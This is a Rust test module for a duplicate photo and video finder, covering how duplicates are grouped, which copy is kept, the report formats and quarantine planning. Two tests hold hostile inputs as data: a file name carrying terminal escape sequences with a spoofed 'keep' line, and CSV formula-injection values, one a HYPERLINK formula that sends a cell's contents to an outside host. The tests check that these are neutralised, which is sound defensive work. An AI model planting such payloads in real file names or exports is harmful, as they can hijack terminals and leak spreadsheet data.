        fingerprint: Vec<u8>,
        width: u32,
        height: u32,
    ) -> ImageHashes {
        ImageHashes {
            pixels: String::from(pixels),
            visual: phash.map(|phash| Visual { phash, fingerprint }),
            dimensions: Dimensions { width, height },
        }
    }

    /// A catalog in a temp dir, filled directly so tests control sizes, hashes and mtimes.
    struct Fixture {
        _dir: TempDir,
        catalog: Catalog,
    }

    impl Fixture {
        fn new() -> Self {
            let dir = tempdir().unwrap();
            let catalog = Catalog::open(&dir.path().join("catalog.sqlite")).unwrap();
            Self { _dir: dir, catalog }
        }

        fn add(&self, root: &str, path: &str, size: u64, mtime_s: i64, sha256: Option<&str>) {
            let id = self.catalog.library_id(root).unwrap();
            self.catalog
                .upsert(
                    id,
                    &FileRecord {
                        path: String::from(path),
                        stamp: Stamp {
                            size,
                            mtime_ns: mtime_s * 1_000_000_000,
                        },
                        media_type: MediaType::Image,
                        sha256: sha256.map(String::from),
                        meta: MediaMeta::default(),
                    },
                )
                .unwrap();
        }

        fn report(&self) -> DupeReport {
            find_dupes(
                &self.catalog,
                &[],
                Similarity::with_images(DEFAULT_THRESHOLD),
            )
            .unwrap()
        }
    }

    /// Each file as its own node.
    fn av_items(avs: &[HashedAv]) -> Vec<AvItem<'_>> {
        avs.iter()
            .enumerate()
            .map(|(node, av)| AvItem { node, av })
            .collect()
    }

    fn kept_and_others(group: &DupeGroup) -> Vec<(bool, &str)> {
        group
            .files
            .iter()
            .map(|f| (f.role.is_keep(), f.path.as_str()))
            .collect()
    }

    #[test]
    fn test_identical_files_in_different_folders_form_one_group() {
        let fx = Fixture::new();
        fx.add("/lib", "2019/a.jpg", 100, 20, Some("aaa"));
        fx.add("/lib", "backup/a.jpg", 100, 10, Some("aaa"));
        fx.add("/lib", "unique.jpg", 200, 10, None);

        let report = fx.report();
        assert_eq!(report.groups.len(), 1);
        assert_eq!(
            kept_and_others(&report.groups[0]),
            vec![(true, "backup/a.jpg"), (false, "2019/a.jpg")]
        );
        assert_eq!(
            report.summary,
            Summary {
                groups: 1,
                redundant_files: 1,
                reclaimable_bytes: 100,
                unhashed_candidates: 0,
                // The fixture's files are images that were never decoded.
                unhashed_media: 3,
            }
        );
    }

    #[test]
    fn test_same_size_different_content_is_not_reported() {
        let fx = Fixture::new();
        fx.add("/lib", "a.jpg", 100, 10, Some("aaa"));
        fx.add("/lib", "b.jpg", 100, 10, Some("bbb"));
        assert_eq!(fx.report().groups, vec![]);
    }

    #[test]
    fn test_keeper_is_oldest_then_path_order() {
        let fx = Fixture::new();
        fx.add("/lib", "c.jpg", 100, 10, Some("aaa"));
        fx.add("/lib", "b.jpg", 100, 10, Some("aaa"));
        fx.add("/lib", "a.jpg", 100, 30, Some("aaa"));
        fx.add("/archive", "z.jpg", 100, 10, Some("aaa"));

        // Three files share the oldest mtime; library root, then path, decides.
        assert_eq!(
            kept_and_others(&fx.report().groups[0]),
            vec![
                (true, "z.jpg"),
                (false, "b.jpg"),
                (false, "c.jpg"),
                (false, "a.jpg")
            ]
        );
    }

    #[test]
    fn test_file_in_overlapping_libraries_is_not_its_own_duplicate() {
        let fx = Fixture::new();
        // The same file, cataloged in two libraries by a version that did not fold them.
        fx.add("/lib", "sub/a.jpg", 100, 10, Some("aaa"));
        fx.add("/lib/sub", "a.jpg", 100, 10, Some("aaa"));
        assert_eq!(fx.report().groups.len(), 0);

        fx.add("/lib", "b.jpg", 100, 20, Some("aaa"));
        assert_eq!(
            kept_and_others(&fx.report().groups[0]),
            vec![(true, "sub/a.jpg"), (false, "b.jpg")]
        );
    }

    #[test]
    fn test_groups_across_libraries_and_library_filter() {
        let fx = Fixture::new();
        fx.add("/nas", "a.jpg", 100, 10, Some("aaa"));
        fx.add("/old-disk", "a.jpg", 100, 20, Some("aaa"));
        fx.add("/old-disk", "b.jpg", 50, 10, Some("bbb"));
        fx.add("/old-disk", "copy of b.jpg", 50, 20, Some("bbb"));
        fx.add("/nas", "c.jpg", 10, 10, Some("ccc"));
        fx.add("/nas", "copy of c.jpg", 10, 20, Some("ccc"));

        assert_eq!(fx.report().groups.len(), 3);

        // Filtering on the old disk shows its groups with all copies, including the one on the
        // NAS, which stays the keeper. Groups only on the NAS are left out.
        let old_disk = fx.catalog.find_library("/old-disk").unwrap().unwrap();
        let report = find_dupes(
            &fx.catalog,
            &[old_disk],
            Similarity::with_images(DEFAULT_THRESHOLD),
        )
        .unwrap();
        let shas: Vec<&str> = report
            .groups
            .iter()
            .map(|g| g.kind.sha256().unwrap())
            .collect();
        assert_eq!(shas, vec!["aaa", "bbb"]);
        let keeper = &report.groups[0].files[0];
        assert_eq!(
            (keeper.library.as_str(), keeper.role.is_keep()),
            ("/nas", true)
        );
    }

    #[test]
    fn test_groups_are_ordered_by_reclaimable_bytes() {
        let fx = Fixture::new();
        fx.add("/lib", "small1.jpg", 10, 1, Some("small"));
        fx.add("/lib", "small2.jpg", 10, 1, Some("small"));
        fx.add("/lib", "big1.mp4", 1000, 1, Some("big"));
        fx.add("/lib", "big2.mp4", 1000, 1, Some("big"));
        let report = fx.report();
        let order: Vec<&str> = report
            .groups
            .iter()
            .map(|g| g.kind.sha256().unwrap())
            .collect();
        assert_eq!(order, vec!["big", "small"]);
        assert_eq!(report.summary.reclaimable_bytes, 1010);
    }

    #[test]
    fn test_counts_unhashed_candidates() {
        let fx = Fixture::new();
        fx.add("/lib", "a.jpg", 100, 10, None);
        fx.add("/lib", "b.jpg", 100, 10, None);
        fx.add("/lib", "c.jpg", 200, 10, None);
        fx.add("/other", "d.jpg", 100, 10, None);
        assert_eq!(fx.report().summary.unhashed_candidates, 3);
        let lib = fx.catalog.find_library("/lib").unwrap().unwrap();
        let report = find_dupes(
            &fx.catalog,
            &[lib],
            Similarity::with_images(DEFAULT_THRESHOLD),
        )
        .unwrap();
        assert_eq!(report.summary.unhashed_candidates, 2);
    }

    #[test]
    fn test_text_output() {
        let fx = Fixture::new();
        fx.add("/lib", "a.jpg", 2048, 0, Some("0123456789abcdef"));
        fx.add("/lib", "b.jpg", 2048, 60, Some("0123456789abcdef"));
        let mut out = vec![];
        write_text(&fx.report(), &mut out).unwrap();
        let text = String::from_utf8(out).unwrap();
        let a = library_path(Path::new("/lib"), "a.jpg");
        let b = library_path(Path::new("/lib"), "b.jpg");
        assert_eq!(
            text,
            format!(
                "2 copies of 2.00 KiB (sha256 0123456789ab):\n  \
                 keep  {}  1970-01-01 00:00 UTC\n        \
                 {}  1970-01-01 00:01 UTC\n\n\
                 1 group, 1 redundant file, 2.00 KiB reclaimable.\n",
                a.display(),
                b.display()
            )
        );
    }

    #[test]
    fn test_text_output_without_duplicates() {
        let mut out = vec![];
        write_text(&DupeReport::default(), &mut out).unwrap();
        assert_eq!(String::from_utf8(out).unwrap(), "No duplicates found.\n");
    }

    #[test]
    fn test_text_output_escapes_control_characters_in_names() {
        let fx = Fixture::new();
        fx.add("/lib", "a.jpg", 2048, 0, Some("aaa"));
        fx.add(
            "/lib",
            "b\u{1b}]0;owned\u{7}\n  keep  c.jpg",
            2048,
            60,
            Some("aaa"),
        );
        let mut out = vec![];
        write_text(&fx.report(), &mut out).unwrap();
        let text = String::from_utf8(out).unwrap();
        assert!(!text.contains(['\u{1b}', '\u{7}']), "{text:?}");
        assert!(
            text.contains("b\\u{1b}]0;owned\\u{7}\\n  keep  c.jpg"),
            "{}",
            text
        );
        assert_eq!(text.lines().filter(|l| l.contains("keep")).count(), 2);
    }

    #[test]
    fn test_json_output() {
        let fx = Fixture::new();
        fx.add("/lib", "a.jpg", 100, 0, Some("aaa"));
        fx.add("/lib", "b.jpg", 100, 1, Some("aaa"));
        let mut out = vec![];
        write_json(&fx.report(), &mut out).unwrap();
        let json: serde_json::Value = serde_json::from_slice(&out).unwrap();
        assert_eq!(
            json,
            serde_json::json!({
                "groups": [{
                    "tier": "exact",
                    "sha256": "aaa",
                    "files": [
                        {"library": "/lib", "path": "a.jpg", "size": 100,
                         "mtime": "1970-01-01T00:00:00Z", "keep": true, "matches": null},
                        {"library": "/lib", "path": "b.jpg", "size": 100,
                         "mtime": "1970-01-01T00:00:01Z", "keep": false, "matches": "exact"},
                    ],
                }],
                "summary": {
                    "groups": 1,
                    "redundant_files": 1,
                    "reclaimable_bytes": 100,
                    "unhashed_candidates": 0,
                    "unhashed_media": 2,
                },
            })
        );
    }

    #[test]
    fn test_csv_output_quotes_fields() {
        let fx = Fixture::new();
        fx.add("/lib", "plain.jpg", 100, 0, Some("aaa"));
        fx.add(
            "/lib",
            "with, comma \"and quotes\".jpg",
            100,
            1,
            Some("aaa"),
        );
        let mut out = vec![];
        write_csv(&fx.report(), &mut out).unwrap();
        assert_eq!(
            String::from_utf8(out).unwrap(),
            "group,tier,sha256,size,keep,matches,library,path,mtime\n\
             1,exact,aaa,100,true,,/lib,plain.jpg,1970-01-01T00:00:00Z\n\
             1,exact,aaa,100,false,exact,/lib,\"with, comma \"\"and quotes\"\".jpg\",\
             1970-01-01T00:00:01Z\n"
        );
    }

    #[test]
    fn test_csv_fields_a_spreadsheet_would_run_are_text() {
        for (value, field) in [
            (
                "=HYPERLINK(\"http://x/?\"&A1).jpg",
                "\"'=HYPERLINK(\"\"http://x/?\"\"&A1).jpg\"",
            ),
            ("+1.jpg", "\"'+1.jpg\""),
            ("-1.jpg", "\"'-1.jpg\""),
            (
                "@eaDir/IMG_1.JPG/SYNOPHOTO_THUMB_M.jpg",
                "\"'@eaDir/IMG_1.JPG/SYNOPHOTO_THUMB_M.jpg\"",
            ),
            ("\tx.jpg", "\"'\tx.jpg\""),
            ("\rx.jpg", "\"'\rx.jpg\""),
            ("a=b.jpg", "a=b.jpg"),
            ("/lib", "/lib"),
        ] {
            assert_eq!(csv_field(value), field, "{:?}", value);
        }
        let fx = Fixture::new();
        fx.add("/lib", "a.jpg", 100, 0, Some("aaa"));
        fx.add("/lib", "=1+1.jpg", 100, 1, Some("aaa"));
        let mut out = vec![];
        write_csv(&fx.report(), &mut out).unwrap();
        assert!(String::from_utf8(out)
            .unwrap()
            .contains(",/lib,\"'=1+1.jpg\","),);
    }

    #[test]
    fn test_visual_tiers_end_to_end_with_scan() {
        use crate::imagehash::tests::{jpeg, picture, with_exif};
        use image::imageops::{resize, FilterType};
        let dir = tempdir().unwrap();
        let lib = dir.path().join("lib");
        std::fs::create_dir_all(lib.join("backup")).unwrap();
        let write = |name: &str, bytes: &[u8]| std::fs::write(lib.join(name), bytes).unwrap();
        let tagged = with_exif(&jpeg(&picture(1, 640, 480), 90));
        write("tagged.jpg", &tagged);
        write("backup/tagged.jpg", &tagged);
        write("stripped.jpg", &jpeg(&picture(1, 640, 480), 90));
        let big = picture(5, 640, 480);
        write("big.jpg", &jpeg(&big, 90));
        write(
            "small.jpg",
            &jpeg(&resize(&big, 320, 240, FilterType::Triangle), 60),
        );
        write("unrelated.jpg", &jpeg(&picture(9, 640, 480), 90));
        // Blank images all have similar hashes; they are left out of similarity matching.
        let blank = |r, g, b| image::RgbImage::from_pixel(640, 480, image::Rgb([r, g, b]));
        write("black.jpg", &jpeg(&blank(0, 0, 0), 90));
        write("white.jpg", &jpeg(&blank(255, 255, 255), 85));
        write("navy.jpg", &jpeg(&blank(20, 20, 90), 80));
        let catalog_path = dir.path().join("catalog.sqlite");
        crate::scan::scan_with(
            &lib,
            &catalog_path,
            crate::scan::ScanOptions::QUIET,
            &crate::decode::Tools::default(),
        )
        .unwrap();

        let catalog = Catalog::open_existing(&catalog_path).unwrap();
        let report =
            find_dupes(&catalog, &[], Similarity::with_images(DEFAULT_THRESHOLD)).unwrap();
        let groups: Vec<(Tier, Vec<&str>)> = report
            .groups
            .iter()
            .map(|g| {
                let mut paths: Vec<&str> = g.files.iter().map(|f| f.path.as_str()).collect();
                paths.sort_unstable();
                (g.tier(), paths)
            })
            .collect();
        assert_eq!(
            groups,
            vec![
                (
                    Tier::SamePixels,
                    vec!["backup/tagged.jpg", "stripped.jpg", "tagged.jpg"]
                ),
                (Tier::Similar, vec!["big.jpg", "small.jpg"]),
            ]
        );
        assert_eq!(report.summary.unhashed_media, 0);

        // Similar images are only looked for when asked.
        let report = find_dupes(&catalog, &[], Similarity::default()).unwrap();
        assert!(report.groups.iter().all(|g| g.tier() != Tier::Similar));
        assert_eq!(report.groups.len(), 1);
    }

    #[test]
    fn test_group_takes_the_weakest_tier_and_keeps_the_largest_similar_image() {
        let fx = Fixture::new();
        fx.add("/lib", "a.jpg", 100, 10, Some("aaa"));
        fx.add("/lib", "b.jpg", 100, 20, Some("aaa"));
        fx.add("/lib", "c.jpg", 50, 5, None);
        let id = fx.catalog.find_library("/lib").unwrap().unwrap();
        let set = |path: &str, pixels: &str, perceptual: u64, side: u32| {
            let hashes = image_hashes(pixels, Some(perceptual), vec![100; 1024], side, side);
            fx.catalog
                .set_image_hashes(id, path, "v", Some(&hashes))
                .unwrap();
        };
        set("a.jpg", "p1", 0, 10);
        set("b.jpg", "p1", 0, 10);
        set("c.jpg", "p2", 0b111, 10);

        let report = find_dupes(&fx.catalog, &[], Similarity::with_images(3)).unwrap();
        assert_eq!(report.groups.len(), 1);
        let group = &report.groups[0];
        assert_eq!(group.kind, GroupKind::Similar);
        // Same pixel count: the larger file wins, then the older one, so not the oldest c.jpg.
        assert_eq!(kept_and_others(group)[0], (true, "a.jpg"));
        let matches: Vec<(&str, Option<Tier>)> = group
            .files
            .iter()
            .map(|f| (f.path.as_str(), f.role.matches()))
            .collect();
        assert_eq!(
            matches,
            [
                ("a.jpg", None),
                ("b.jpg", Some(Tier::Exact)),
                ("c.jpg", Some(Tier::Similar))
            ]
        );
        assert_eq!(group.reclaimable_bytes(), 150);

        // More pixels beat more bytes.
        set("c.jpg", "p2", 0b111, 40);
        let report = find_dupes(&fx.catalog, &[], Similarity::with_images(3)).unwrap();
        assert_eq!(kept_and_others(&report.groups[0])[0], (true, "c.jpg"));

        // Without the similar link the group is exact, and the oldest copy is kept.
        let report = find_dupes(&fx.catalog, &[], Similarity::with_images(2)).unwrap();
        assert_eq!(report.groups.len(), 1);
        assert_eq!(report.groups[0].tier(), Tier::Exact);
        assert_eq!(kept_and_others(&report.groups[0])[0], (true, "a.jpg"));
    }

    #[test]
    fn test_similar_group_keeps_the_original_over_a_larger_same_pixel_copy() {
        // A photo manager rewrote the metadata of a copy, which made it larger; a burst shot
        // links them into a similar group. The original is still kept.
        let fx = Fixture::new();
        fx.add("/lib", "original.jpg", 100, 1, None);
        fx.add("/lib", "edited.jpg", 120, 5, None);
        fx.add("/lib", "burst.jpg", 90, 3, None);
        let id = fx.catalog.find_library("/lib").unwrap().unwrap();
        let set = |path: &str, pixels: &str, perceptual: u64| {
            let hashes = image_hashes(pixels, Some(perceptual), vec![100; 1024], 10, 10);
            fx.catalog
                .set_image_hashes(id, path, "v", Some(&hashes))
                .unwrap();
        };
        set("original.jpg", "p1", 0);
        set("edited.jpg", "p1", 0);
        set("burst.jpg", "p2", 1);
        let report = find_dupes(&fx.catalog, &[], Similarity::with_images(3)).unwrap();
        let matches: Vec<(&str, Option<Tier>)> = report.groups[0]
            .files
            .iter()
            .map(|f| (f.path.as_str(), f.role.matches()))
            .collect();
        assert_eq!(
            matches,
            [
                ("original.jpg", None),
                ("edited.jpg", Some(Tier::SamePixels)),
                ("burst.jpg", Some(Tier::Similar))
            ]
        );
    }

    #[test]
    fn test_audio_without_detail_is_never_similar() {
        let audio = |values: Vec<u32>| HashedAv {
            file: HashedFile::default(),
            dimensions: None,
            signature: AvSignature::Audio(AudioFingerprint {
                duration_ms: 30_000,
                values,
            }),
        };
        let tone = || vec![558_758_263; 221];
        let music = || (0..221u32).map(|i| i.wrapping_mul(2_654_435_761)).collect();
        let silent = [audio(tone()), audio(tone())];
        assert_eq!(
            similar_av(&av_items(&silent), DEFAULT_THRESHOLD, true),
            vec![]
        );
        let copies = [audio(music()), audio(music())];
        assert_eq!(
            similar_av(&av_items(&copies), DEFAULT_THRESHOLD, true),
            vec![(0, 1)]
        );
    }

    #[test]
    fn test_similar_needs_matching_aspect_ratios_and_detail() {
        let fx = Fixture::new();
        fx.add("/lib", "wide.jpg", 100, 1, None);
        fx.add("/lib", "square.jpg", 90, 2, None);
        fx.add("/lib", "wide copy.jpg", 80, 3, None);
        fx.add("/lib", "flat.jpg", 70, 4, None);
        fx.add("/lib", "flat too.jpg", 60, 5, None);
        let id = fx.catalog.find_library("/lib").unwrap().unwrap();
        let set = |path: &str, perceptual: Option<u64>, width: u32, height: u32| {
            let hashes = image_hashes(path, perceptual, vec![100; 1024], width, height);
            fx.catalog
                .set_image_hashes(id, path, "v", Some(&hashes))
                .unwrap();
        };
        set("wide.jpg", Some(0), 400, 300);
        set("square.jpg", Some(0), 300, 300);
        // Rotated by 90 degrees: the same shape.
        set("wide copy.jpg", Some(1), 225, 301);
        set("flat.jpg", None, 400, 300);
        set("flat too.jpg", None, 400, 300);

        let report =
            find_dupes(&fx.catalog, &[], Similarity::with_images(DEFAULT_THRESHOLD)).unwrap();
        assert_eq!(report.groups.len(), 1);
        let mut paths: Vec<&str> = report.groups[0]
            .files
            .iter()
            .map(|f| f.path.as_str())
            .collect();
        paths.sort_unstable();
        assert_eq!(paths, ["wide copy.jpg", "wide.jpg"]);
    }

    #[test]
    fn test_similar_images_are_not_taken_at_different_times() {
        let fingerprint = vec![100u8; 1024];
        let at = |time: &str| crate::dates::from_taken_at(time);
        let key = |node: usize, taken: Option<Taken>| ImageKey {
            node,
            phash: 0,
            dimensions: Dimensions::new(Some(40), Some(30)),
            taken,
            fingerprint: &fingerprint,
        };
        let pairs = |a: Option<Taken>, b: Option<Taken>| {
            similar_images(&[key(0, a), key(1, b)], DEFAULT_THRESHOLD)
        };
        let shot = at("2024-05-01T12:00:00");
        // Burst shots a second apart.
        assert_eq!(pairs(shot, at("2024-05-01T12:00:01")), vec![]);
        // The same second, in either stored format, or a copy that lost the time.
        assert_eq!(pairs(shot, at("2024-05-01T12:00:00+02:00")), vec![(0, 1)]);
        assert_eq!(pairs(shot, None), vec![(0, 1)]);
    }

    #[test]
    fn test_similar_needs_matching_fingerprints() {
        // Two burst shots: the same perceptual hash, but part of the picture changed.
        let fx = Fixture::new();
        fx.add("/lib", "shot 1.jpg", 100, 1, None);
        fx.add("/lib", "shot 2.jpg", 100, 2, None);
        let id = fx.catalog.find_library("/lib").unwrap().unwrap();
        let mut moved = vec![100u8; 1024];
        moved[..40].fill(200);
        for (path, fingerprint) in [("shot 1.jpg", vec![100u8; 1024]), ("shot 2.jpg", moved)] {
            let hashes = image_hashes(path, Some(0), fingerprint, 40, 30);
            fx.catalog
                .set_image_hashes(id, path, "v", Some(&hashes))
                .unwrap();
        }
        let report =
            find_dupes(&fx.catalog, &[], Similarity::with_images(DEFAULT_THRESHOLD)).unwrap();
        assert_eq!(report.groups, vec![]);
    }

    #[test]
    fn test_exact_copies_share_a_pixel_hash() {
        // b.jpg is a byte-identical copy of a.jpg that was never decoded; c.jpg has the same
        // pixels as a.jpg. All three have the same pixels.
        let fx = Fixture::new();
        fx.add("/lib", "a.jpg", 100, 1, Some("aaa"));
        fx.add("/lib", "b.jpg", 100, 2, Some("aaa"));
        fx.add("/lib", "c.jpg", 90, 3, None);
        let id = fx.catalog.find_library("/lib").unwrap().unwrap();
        for path in ["a.jpg", "c.jpg"] {
            let phash = path.len() as u64 * 0xffff;
            let hashes = image_hashes("p", Some(phash), vec![100; 1024], 10, 10);
            fx.catalog
                .set_image_hashes(id, path, "v", Some(&hashes))
                .unwrap();
        }
        let report = find_dupes(&fx.catalog, &[], Similarity::with_images(0)).unwrap();
        assert_eq!(report.groups.len(), 1);
        assert_eq!(report.groups[0].tier(), Tier::SamePixels);
    }

    #[test]
    fn test_short_videos_are_only_compared_with_similar() {
        let video = |duration_ms: i64| HashedAv {
            file: HashedFile::default(),
            dimensions: Some(Dimensions {
                width: 640,
                height: 360,
            }),
            signature: AvSignature::Video(VideoSignature {
                duration_ms,
                frames: (0..9).map(Some).collect(),
            }),
        };
        let short = [video(3000), video(3000)];
        assert_eq!(
            similar_av(&av_items(&short), DEFAULT_THRESHOLD, false),
            vec![]
        );
        assert_eq!(
            similar_av(&av_items(&short), DEFAULT_THRESHOLD, true),
            vec![(0, 1)]
        );
        let long = [video(SHORT_VIDEO_MS), video(SHORT_VIDEO_MS)];
        assert_eq!(
            similar_av(&av_items(&long), DEFAULT_THRESHOLD, false),
            vec![(0, 1)]
        );
    }

    #[test]
    fn test_re_encoded_video_is_similar() {
        let dir = tempdir().unwrap();
        let lib = dir.path().join("lib");
        std::fs::create_dir_all(&lib).unwrap();
        let Some((a, _, _)) = crate::avhash::tests::videos(&lib) else {
            eprintln!("ffmpeg not available, skipping");
            return;
        };
        let tools = crate::decode::Tools::find();
        if tools.ffprobe.is_none() {
            eprintln!("ffprobe not available, skipping");
            return;
        }
        // A newer exact copy of the original.
        std::fs::create_dir(lib.join("backup")).unwrap();
        let copy = lib.join("backup/a.mp4");
        std::fs::copy(&a, &copy).unwrap();
        let later = std::fs::metadata(&a).unwrap().modified().unwrap()
            + std::time::Duration::from_secs(3600);
        std::fs::File::options()
            .write(true)
            .open(&copy)
            .unwrap()
            .set_modified(later)
            .unwrap();
        let catalog_path = dir.path().join("catalog.sqlite");
        crate::scan::scan_with(&lib, &catalog_path, crate::scan::ScanOptions::QUIET, &tools)
            .unwrap();
        let catalog = Catalog::open_existing(&catalog_path).unwrap();
        let report =
            find_dupes(&catalog, &[], Similarity::with_images(DEFAULT_THRESHOLD)).unwrap();
        // The re-encoded copy matches; the larger original is kept, not the smaller copy; the
        // unrelated video is not in any group.
        assert_eq!(report.groups.len(), 1);
        assert_eq!(report.groups[0].tier(), Tier::Similar);
        let files: Vec<(&str, Option<Tier>)> = report.groups[0]
            .files
            .iter()
            .map(|f| (f.path.as_str(), f.role.matches()))
            .collect();
        assert_eq!(
            files,
            vec![
                ("a.mp4", None),
                ("backup/a.mp4", Some(Tier::Exact)),
                ("b.mp4", Some(Tier::Similar)),
            ]
        );
        // Similar video is found without asking for similar images.
        assert_eq!(
            find_dupes(&catalog, &[], Similarity::default())
                .unwrap()
                .groups
                .len(),
            1
        );
        // The exact copy is quarantined even though the group is similar; the re-encode is not.
        let quarantine = dir.path().join("quarantine");
        let (plan, _) = crate::plan::plan_quarantine(
            &catalog,
            &catalog_path,
            &report,
            &[],
            &quarantine,
            OffsetDateTime::now_utc(),
        )
        .unwrap();
        let moved: Vec<&Path> = plan.moves.iter().map(|m| m.from.as_path()).collect();
        let copy = crate::paths::resolve(&copy).unwrap();
        assert_eq!(moved, vec![copy.as_path()]);
    }

    #[test]
    fn test_end_to_end_with_scan() {
        let dir = tempdir().unwrap();
        let lib = dir.path().join("lib");
        std::fs::create_dir_all(lib.join("backup")).unwrap();
        std::fs::write(lib.join("a.jpg"), b"same").unwrap();
        std::fs::write(lib.join("backup/a.jpg"), b"same").unwrap();
        std::fs::write(lib.join("other.jpg"), b"diff").unwrap();
        let catalog_path = dir.path().join("catalog.sqlite");
        crate::scan::scan_with(
            &lib,
            &catalog_path,
            crate::scan::ScanOptions::QUIET,
            &crate::decode::Tools::default(),
        )
        .unwrap();

        let catalog = Catalog::open_existing(&catalog_path).unwrap();
        let report =
            find_dupes(&catalog, &[], Similarity::with_images(DEFAULT_THRESHOLD)).unwrap();
        assert_eq!(report.groups.len(), 1);
        let mut paths: Vec<&str> = report.groups[0]
            .files
            .iter()
            .map(|f| f.path.as_str())
            .collect();
        paths.sort_unstable();
        assert_eq!(paths, vec!["a.jpg", "backup/a.jpg"]);
    }
}
